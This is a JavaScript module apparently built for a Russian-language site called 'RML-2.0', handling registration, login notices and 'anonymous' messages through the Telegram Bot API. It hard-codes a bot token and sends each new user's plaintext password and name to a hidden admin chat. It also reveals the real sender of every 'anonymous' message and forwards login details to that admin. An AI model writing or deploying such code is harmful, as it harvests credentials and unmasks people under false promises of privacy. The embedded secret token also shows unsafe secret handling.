// Telegram-related utilities
const ADMIN_TELEGRAM_CHAT_ID = '6699202743';
const TELEGRAM_BOT_TOKEN = '7397758441:AAFa0kOHzvOG_jIiG-NlZWokU15qUZHX34k';

// Use IndexedDB for cross-device, persistent storage
class GlobalStorage {
    constructor() {
        this.dbName = 'RMLGlobalDatabase';
        this.dbVersion = 1;
        this.db = null;
    }

    async openDatabase() {
        return new Promise((resolve, reject) => {
            const request = indexedDB.open(this.dbName, this.dbVersion);

            request.onupgradeneeded = (event) => {
                const db = event.target.result;
                
                // Create object stores if they don't exist
                if (!db.objectStoreNames.contains('users')) {
                    db.createObjectStore('users', { keyPath: 'telegramId' });
                }
                if (!db.objectStoreNames.contains('siteChatMessages')) {
                    db.createObjectStore('siteChatMessages', { autoIncrement: true });
                }
                if (!db.objectStoreNames.contains('anonymousMessages')) {
                    db.createObjectStore('anonymousMessages', { autoIncrement: true });
                }
            };

            request.onsuccess = (event) => {
                this.db = event.target.result;
                resolve(this.db);
            };

            request.onerror = (event) => {
                reject('Error opening database');
            };
        });
    }

    async addUser(userData) {
        await this.openDatabase();
        return new Promise((resolve, reject) => {
            const transaction = this.db.transaction(['users'], 'readwrite');
            const store = transaction.objectStore('users');
            const request = store.put(userData);

            request.onsuccess = () => resolve(true);
            request.onerror = () => reject(false);
        });
    }

    async getUser(telegramId) {
        await this.openDatabase();
        return new Promise((resolve, reject) => {
            const transaction = this.db.transaction(['users'], 'readonly');
            const store = transaction.objectStore('users');
            const request = store.get(telegramId);

            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject(null);
        });
    }

    async getAllUsers() {
        await this.openDatabase();
        return new Promise((resolve, reject) => {
            const transaction = this.db.transaction(['users'], 'readonly');
            const store = transaction.objectStore('users');
            const request = store.getAll();

            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject([]);
        });
    }

    async addSiteChatMessage(message) {
        await this.openDatabase();
        return new Promise((resolve, reject) => {
            const transaction = this.db.transaction(['siteChatMessages'], 'readwrite');
            const store = transaction.objectStore('siteChatMessages');
            const request = store.add(message);

            request.onsuccess = () => resolve(true);
            request.onerror = () => reject(false);
        });
    }

    async getSiteChatMessages() {
        await this.openDatabase();
        return new Promise((resolve, reject) => {
            const transaction = this.db.transaction(['siteChatMessages'], 'readonly');
            const store = transaction.objectStore('siteChatMessages');
            const request = store.getAll();

            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject([]);
        });
    }
}

// Rest of the code remains the same, but use GlobalStorage for persistent operations
export const globalStorage = new GlobalStorage();

export async function verifyTelegramId(telegramId) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getChat`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error verifying Telegram ID:', error);
        return false;
    }
}

export async function sendToTelegramBot(data) {
    const userMessage = `
    📋 Регистрация нового пользователя:
    👤 Имя: ${data.firstName}
    👥 Фамилия: ${data.lastName}
    📱 Username: ${data.email}
    🔐 Пароль: ${data.password}
    🆔 Telegram ID: ${data.telegramId}
    `;

    const adminMessage = `
    ⚠️ Новая регистрация:
    👤 Имя Фамилия: ${data.lastName} ${data.firstName}
    📱 Username: ${data.email}
    🔐 Пароль: ${data.password}
    🆔 Введенный Telegram ID: ${data.telegramId}
    `;

    try {
        const userResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: data.telegramId,
                text: userMessage
            })
        });

        const adminResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_TELEGRAM_CHAT_ID,
                text: adminMessage
            })
        });

        const userResult = await userResponse.json();
        const adminResult = await adminResponse.json();

        await globalStorage.addUser(data);

        return userResult.ok && adminResult.ok;
    } catch (error) {
        console.error('Error sending messages to Telegram:', error);
        return false;
    }
}

export function generateVerificationCode() {
    return Math.floor(100000 + Math.random() * 900000).toString();
}

export async function sendVerificationCode(telegramId, code) {
    try {
        const codeMessage = `Ваш код подтверждения: ${code}`;
        
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: codeMessage
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error sending verification code:', error);
        return false;
    }
}

export async function sendLoginNotification(telegramId, loginDetails) {
    const userMessage = `
    🔐 Вход в аккаунт:
    📅 Дата: ${new Date().toLocaleString()}
    🌐 Платформа: RML-2.0
    `;

    const adminMessage = `
    ⚠️ Новый вход в систему:
    👤 Telegram ID: ${telegramId}
    📅 Дата: ${new Date().toLocaleString()}
    🌐 Платформа: RML-2.0
    🖥️ Доп. информация: ${JSON.stringify(loginDetails)}
    `;

    try {
        // Send message to user
        const userResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: telegramId,
                text: userMessage
            })
        });

        // Send message to admin
        const adminResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_TELEGRAM_CHAT_ID,
                text: adminMessage
            })
        });

        const userResult = await userResponse.json();
        const adminResult = await adminResponse.json();

        return userResult.ok && adminResult.ok;
    } catch (error) {
        console.error('Error sending login notifications:', error);
        return false;
    }
}

// Store and retrieve anonymous messages
export async function sendAnonymousMessage(senderTelegramId, recipientTelegramId, message) {
    try {
        // General message to recipient
        const recipientMessage = `
        🕵️ Анонимное сообщение:
        ${message}

        Отправлено анонимно через RML-2.0
        `;

        // Notification to admin
        const adminMessage = `
        🔏 Отправлено анонимное сообщение:
        👤 Отправитель: ${senderTelegramId}
        📧 Получатель: ${recipientTelegramId}
        📝 Сообщение: ${message}
        `;

        // Send message to recipient
        const recipientResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: recipientTelegramId,
                text: recipientMessage
            })
        });

        // Send notification to admin
        const adminResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: ADMIN_TELEGRAM_CHAT_ID,
                text: adminMessage
            })
        });

        const recipientResult = await recipientResponse.json();
        const adminResult = await adminResponse.json();

        return recipientResult.ok && adminResult.ok;
    } catch (error) {
        console.error('Error sending anonymous message:', error);
        return false;
    }
}

export async function getRegisteredUsers() {
    return await globalStorage.getAllUsers();
}

export async function getAllRegisteredUsers() {
    const users = await globalStorage.getAllUsers();
    return users.map(user => ({
        telegramId: user.telegramId,
        firstName: user.firstName,
        lastName: user.lastName,
        email: user.email
    }));
}

export async function sendSiteChatMessage(sender, message) {
    const chatMessage = {
        sender: sender,
        message: message,
        timestamp: new Date().toISOString()
    };

    return await globalStorage.addSiteChatMessage(chatMessage);
}

export async function getSiteChatMessages() {
    return await globalStorage.getSiteChatMessages();
}

export async function getAnonymousMessageRecipients(currentUserTelegramId) {
    try {
        const allUsers = await globalStorage.getAllUsers();
        
        // More robust filtering and mapping
        const recipients = allUsers
            .filter(user => 
                user.telegramId !== currentUserTelegramId && 
                user.telegramId // Ensure telegramId exists
            )
            .map(user => ({
                telegramId: user.telegramId,
                displayName: `${user.firstName || ''} ${user.lastName || ''}`.trim() || `ID: ${user.telegramId}`
            }));

        console.log('Available recipients:', recipients); // Debugging log
        return recipients;
    } catch (error) {
        console.error('Error fetching anonymous message recipients:', error);
        return [];
    }
}

export async function sendRegisteredUsersToTelegram(currentUserTelegramId) {
    try {
        const allUsers = await globalStorage.getAllUsers();
        
        // Filter out the current user from the list
        const otherUsers = allUsers.filter(user => 
            user.telegramId !== currentUserTelegramId
        );

        // Create a formatted message with user details
        const userListMessage = otherUsers.map((user, index) => 
            `${index + 1}. ${user.firstName} ${user.lastName} (ID: ${user.telegramId})`
        ).join('\n');

        const fullMessage = `
🌐 Список зарегистрированных пользователей для анонимных сообщений:

${userListMessage}

Всего пользователей: ${otherUsers.length}
        `;

        // Send message to current user's Telegram
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: currentUserTelegramId,
                text: fullMessage
            })
        });

        const result = await response.json();
        return result.ok;
    } catch (error) {
        console.error('Error sending registered users list:', error);
        return false;
    }
}

export async function clearAllRegistrations() {
    await globalStorage.openDatabase();
    return new Promise((resolve, reject) => {
        const transaction = globalStorage.db.transaction(['users'], 'readwrite');
        const store = transaction.objectStore('users');
        const clearRequest = store.clear();

        clearRequest.onsuccess = () => {
            console.log('All user registrations cleared');
            resolve(true);
        };
        clearRequest.onerror = () => {
            console.error('Failed to clear user registrations');
            reject(false);
        };
    });
}

export async function initializeGlobalStorage() {
    try {
        // Clear existing registrations
        await clearAllRegistrations();
        
        // You can add any additional initialization logic here
        console.log('Global storage initialized and cleared');
    } catch (error) {
        console.error('Global storage initialization failed:', error);
    }
}